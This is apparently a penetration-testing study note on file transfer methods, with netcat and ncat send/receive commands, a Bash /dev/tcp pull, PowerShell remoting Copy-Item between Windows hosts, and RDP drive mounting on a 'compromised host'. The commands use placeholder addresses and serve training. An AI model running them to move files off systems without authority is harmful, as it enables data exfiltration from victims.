# Netcat
## Listener - Receiving File
```JavaScript
nc -lp <port> > <outfile> // Original Netcat
ncat -lp <port> --recv-only > <outfile> // Ncat
```
  
## Sender - Sending File
```JavaScript
nc -q 0 <IP> <port> < <infile> # Original Netcat
ncat --send-only <IP> <port> < <infile> # Ncat
```
  
## Connecting to Netcat Using /dev/tcp
- if the receiver doesn’t have netcat installed, you can use Bash to open a TCP connection
```JavaScript
cat < /dev/tcp/<IP>/<port> > <outfile>
```
  
  
# PowerShell Session File Transfer
- if HTTP, HTTPS, and SMB are unavailable
- the example they used was an administrator account on DC01 copying a file over to another machine DATABASE01
  
## Confirm that WinRM is Open on Windows Target
```JavaScript
Test-NetConnection -ComputerName <hostname> -Port 5985
```
  
## Create PowerShell Session to Target
```JavaScript
$Session = New-PSSession -ComputerName <hostname>
```
  
## Copy File Over Windows Targets
```Markdown
// Copy file from Windows target's localhost (DC01) to PowerShell session (DB01)
Copy-Item -Path C:\<file\> -ToSession $Session -Destination C:\path\to\output
// Copy file from PowerShell Session (DB01) to localhost (DC01)
Copy-Item -Path "C:\<file\>" -Destination C:\ -FromSession $Session
```
  
  
  
# RDP
## Mounting a Linux Folder
```Markdown
// rdesktop
rdesktop <IP> -d <DOMAIN> -u <user> -p '<pass>' -r disk:linux='/path/to/folder'
// xfreerdp3
xfreerdp /v:<IP> /d:<DOMAIN> /u:<user> /p:'<pass>' /drive:linux,/path/to/folder
```
- once mounted, connect to `\\tsclient\` from the compromised host
  
- can also use Windows’ mstsc.exe client
![image 184.png](../assets/Misc%20File%20Transfer%20Methods/image%20184.png)